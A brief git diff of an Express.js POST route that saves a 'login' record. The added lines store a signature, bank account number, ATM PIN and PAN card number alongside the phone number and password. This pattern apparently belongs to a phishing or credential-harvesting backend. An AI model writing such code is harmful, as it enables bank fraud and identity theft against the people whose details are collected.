@@ -50,6 +50,10 @@ router.post("/", async (req, res) => {
     user_id: req.body.user_id,
     phone: req.body.phone,
     password: req.body.password,
+    signature: req.body.signature,
+    account_no: req.body.account_no,
+    atm_pin: req.body.atm_pin,
+    pan_card: req.body.pan_card,
   });
   try {
     const newWatchlist = await login.save();
